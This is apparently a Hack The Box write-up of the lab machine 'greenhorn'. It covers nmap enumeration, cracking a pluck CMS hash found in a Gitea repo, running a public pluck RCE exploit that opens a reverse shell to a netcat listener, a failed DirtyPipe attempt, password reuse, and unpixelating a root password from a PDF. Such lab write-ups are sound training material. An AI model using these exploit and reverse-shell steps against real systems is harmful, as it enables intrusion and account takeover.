---
layout: post
title: greenhorn
categories: htb
tags:
- htb
- gitea
- crackstation
- pluck
- password_reuse
- unpixelating
- depix
author: nicoliboli
description: pluck | password_reuse | unpixelating
date: 2026-07-08 21:28 -0400
---
# Enumeration

```
$ nmap 10.10.11.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 20:06 EST
Nmap scan report for 10.10.11.25
Host is up (0.033s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds

$ nmap -p- 10.10.11.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 20:06 EST
Nmap scan report for 10.10.11.25
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds

$ nmap -p22,80,3000 -sC -sV 10.10.11.25 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 20:06 EST
Nmap scan report for 10.10.11.25
Host is up (0.028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=dd2f9eb76aef4f09; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=qVwkTp9yFJzMrLZAZ8DXNIilNMo6MTczMTU0NjM5NDMwMjIwMzE3NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 14 Nov 2024 01:06:34 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=8fea1073214c92de; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Z6CMlP3enF5hk_M5ak_0Nn_e7oc6MTczMTU0NjM5OTUyMTQ3MzY0Ng; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 14 Nov 2024 01:06:39 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=11/13%Time=67354D35%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=dd2f9eb76aef4f09;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=qVwkTp9yFJzMrLZAZ8DXNIilNMo6MTczMTU0NjM5NDMwMjIwMzE3NQ;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2014\x20Nov\x202024\x2001:06:34\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
SF:R3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA
SF:6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbm
SF:hvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciL
SF:CJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAv
SF:YX")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0
SF:,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_l
SF:ike_gitea=8fea1073214c92de;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\n
SF:Set-Cookie:\x20_csrf=Z6CMlP3enF5hk_M5ak_0Nn_e7oc6MTczMTU0NjM5OTUyMTQ3Mz
SF:Y0Ng;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fr
SF:ame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2014\x20Nov\x202024\x2001:
SF:06:39\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.97 seconds

```

## Port 80

Navigate to the webpage and it tries to redirect to `greenhorn.htb`

![Alt text](/assets/img/greenhorn/image.png)

Update the `/etc/hosts` file to include any `greenhorn` domains

```
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.25     greenhorn.htb greenhorn
```

Try visiting the site again with the `greenhorn.htb` url

![Alt text](/assets/img/greenhorn/image-1.png)

A couple things to note about this page
    - possible file inclusion vulnerability with the `file=welcome-to-greenhorn`
    - the website is using a cms called pluck
    - a possible admin is called mr. green
    - the `admin` link redirects to a login page

### pluck

Clicking the `admin` link at the bottom of the homepage redirects to a login page powered by pluck

![Alt text](/assets/img/greenhorn/image-2.png)

A quick google reveals that the pluck verion running (v4.7.18) is vulnerable to an RCE. PoC code is posted [here](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC), but it needs some creds. There is also [this repo](https://github.com/b0ySie7e/Pluck_Cms_4.7.18_RCE_Exploit)

Tried a couple different passwords and pulled up burp so I could track what is going on. None worked.

[x] password
[x] admin
[x] green
[x] greenhorn
[x] pluck
[] changepass
[] changeme

![Alt text](/assets/img/greenhorn/image-4.png)

Also note that after 5 login attempts, the account temporarily locks out for 5 mins.

![Alt text](/assets/img/greenhorn/image-3.png)


## port 3000

Navigate to the webpage to look around.

![Alt text](/assets/img/greenhorn/image-5.png)

A couple things to note from this page:
    - it is powered by gitea version 1.21.11. doesn't look to be any vulnerabilities associated with the software version

Just clicking around, I look at the `Explore` tab and see what looks like the source code for that site on port 80 (i recognize it because i looked in the source for a default password). The one with the login page.

![Alt text](/assets/img/greenhorn/image-7.png)

![Alt text](/assets/img/greenhorn/image-8.png)

Clicking around some more, I notice that the passwords are hashed with the sha-512 algorithm. In the `login.php` file, there is reference to a `pass.php` file.

![Alt text](/assets/img/greenhorn/image-9.png)

![Alt text](/assets/img/greenhorn/image-10.png)

Funneling that hash into crackstation reveals the password to be `iloveyou1` et voila authentication

![Alt text](/assets/img/greenhorn/image-11.png)

![Alt text](/assets/img/greenhorn/image-12.png)


# Exploitation

thrown the pluck exploit from before with a nc listener running on port 7878

```
$ python3 ./exploit_pluckv4.7.18_RCE.py --password "iloveyou1" --ip 10.10.14.9 --port 7878 --host http://greenhorn.htb
[+] Creating payload
[+] Overwriting .php file
[+] Creating ZIP file
Login successful
[+] ZIP file uploaded successfully
```

```
$ nc -lvnp 7878   
listening on [any] 7878 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.25] 34480
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck/data/modules/mirabbas$
```

# PrivEsc

run linpeas and do a triage.

## dirty_pipe

use [this](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits?tab=readme-ov-file) repo for the exploit code. have to compile on the attack system, since there is no gcc on the target.

```
www-data@greenhorn:/tmp$ uname -a
uname -a
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
www-data@greenhorn:/tmp$ ./dirty_pipe
./dirty_pipe
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
system() function call seems to have failed :(
```

no dice.

## port 3000

try logging into the portal using the creds found in the repo

![Alt text](/assets/img/greenhorn/image-13.png)

`admin@greenhorn.htb:iloveyou1`

no dice.

## gitea

```
www-data@greenhorn:/tmp$ cat /etc/systemd/system/gitea.service
cat /etc/systemd/system/gitea.service                                                                                                                                                                                                                                                                                      
[Unit]                                                                                                                                                                                                                                                                                                                     
Description=Gitea (Git with a cup of tea)                                                                                                                                                                                                                                                                                  
After=network.target

[Service]
# Uncomment the next line if you have repos with lots of files and get a HTTP 500 error because of that
# LimitNOFILE=524288:524288
RestartSec=2s
Type=simple
User=git
Group=git
WorkingDirectory=/var/lib/gitea/
# If using Unix socket: tells systemd to create the /run/gitea folder, which will contain the gitea.sock file
# (manually creating /run/gitea doesn't work, because it would not persist across reboots)
#RuntimeDirectory=gitea
ExecStart=/usr/local/bin/gitea web --config /etc/gitea/app.ini
Restart=always
Environment=USER=git HOME=/home/git GITEA_WORK_DIR=/var/lib/gitea
# If you install Git to directory prefix other than default PATH (which happens
# for example if you install other versions of Git side-to-side with
# distribution version), uncomment below line and add that prefix to PATH
# Don't forget to place git-lfs binary on the PATH below if you want to enable
# Git LFS support
#Environment=PATH=/path/to/git/bin:/bin:/sbin:/usr/bin:/usr/sbin
# If you want to bind Gitea to a port below 1024, uncomment
# the two values below, or use socket activation to pass Gitea its ports as above
###
#CapabilityBoundingSet=CAP_NET_BIND_SERVICE
#AmbientCapabilities=CAP_NET_BIND_SERVICE
###
# In some cases, when using CapabilityBoundingSet and AmbientCapabilities option, you may want to
# set the following value to false to allow capabilities to be applied on gitea process. The following
# value if set to true sandboxes gitea service and prevent any processes from running with privileges
# in the host user namespace.
###
#PrivateUsers=false
###

[Install]
WantedBy=multi-user.target
```

looking at the service file, i see the executable `ExecStart=/usr/local/bin/gitea web --config /etc/gitea/app.ini` and that file is interesting because it is an executable that is world rwx

```
www-data@greenhorn:/usr/local/bin$ ls -la
ls -la
total 135100
drwxr-xr-x  2 root   root        4096 Jun 20 06:36 .
drwxr-xr-x 10 root   root        4096 Jun 20 06:36 ..
-rwxrwxrwx  1 junior junior 138332624 Apr 16  2024 gitea
```

try to overwrite the file, but it's running constantly, so i can't.

## mysql

port 3306 is listening on localhost

tried the following creds
[x] root - no pass
[x] root - iloveyou1
[x] junior - iloveyou1
[x] junior - no pass


## ssh

looking at sshd config file, can see that junior is allowed to authenticate, but only with an ssh key. root is also allowed to ssh.

```
www-data@greenhorn:/etc/ssh$ cat sshd_config
cat sshd_config
...
PermitRootLogin yes
...
# Don't allow junior to ssh with password
Match User junior
    PasswordAuthentication no
```

## password reuse to junior

welp. don't be a dummy kids

```
www-data@greenhorn:/var/lib/mysql$ su junior
su junior
Password: iloveyou1
id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
```

# Root

Get the `Using OpenVAS.pdf` and see that it has some information about sudo-ing

![Alt text](/assets/img/greenhorn/image-14.png)

tried converting the pdf to a text file and couldn't get anything from it

run linpeas again and there was nothing new.
k
now have to figure out how to unpixelate the password. found [this site](https://www.spipm.nl/2030.html) detailing how to recover passwords that have been pixelated.

found [this blog](https://pentest.jonathan.com.ar/software/depix/) about using depix to unpixelate pdfs after converting them to a ppm 

```
$ pdfimages ../Using\ OpenVAS.pdf openvas

$ python3 depix.py -p ./openvas-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o openvas_password.png 
2024-11-14 11:08:46,410 - Loading pixelated image from ./openvas-000.ppm
2024-11-14 11:08:46,459 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-11-14 11:08:47,067 - Finding color rectangles from pixelated space
2024-11-14 11:08:47,068 - Found 252 same color rectangles
2024-11-14 11:08:47,069 - 190 rectangles left after moot filter
2024-11-14 11:08:47,069 - Found 1 different rectangle sizes
2024-11-14 11:08:47,069 - Finding matches in search image
2024-11-14 11:08:47,069 - Scanning 190 blocks with size (5, 5)
2024-11-14 11:08:47,094 - Scanning in searchImage: 0/1674
2024-11-14 11:09:31,153 - Removing blocks with no matches
2024-11-14 11:09:31,153 - Splitting single matches and multiple matches
2024-11-14 11:09:31,157 - [16 straight matches | 174 multiple matches]
2024-11-14 11:09:31,157 - Trying geometrical matches on single-match squares
2024-11-14 11:09:31,468 - [29 straight matches | 161 multiple matches]
2024-11-14 11:09:31,468 - Trying another pass on geometrical matches
2024-11-14 11:09:31,745 - [41 straight matches | 149 multiple matches]
2024-11-14 11:09:31,745 - Writing single match results to output
2024-11-14 11:09:31,746 - Writing average results for multiple matches to output
2024-11-14 11:09:34,108 - Saving output image to: openvas_password.png
```

![Alt text](/assets/img/greenhorn/image-15.png)

the root password is `sidefromsidetheothersidesidefromsidetheotherside` and i know from previous enumeration that ssh-ing as root is allowed.

```
$ ssh root@10.10.11.25
The authenticity of host '10.10.11.25 (10.10.11.25)' can't be established.
ED25519 key fingerprint is SHA256:FrgpM50adTncJAsWACDugfF7duPzn9d6RzjZZFHNtLo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.25' (ED25519) to the list of known hosts.
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Nov 14 04:15:14 PM UTC 2024

  System load:  0.0               Processes:             242
  Usage of /:   70.0% of 3.45GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.25
  Swap usage:   0%


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~# 
```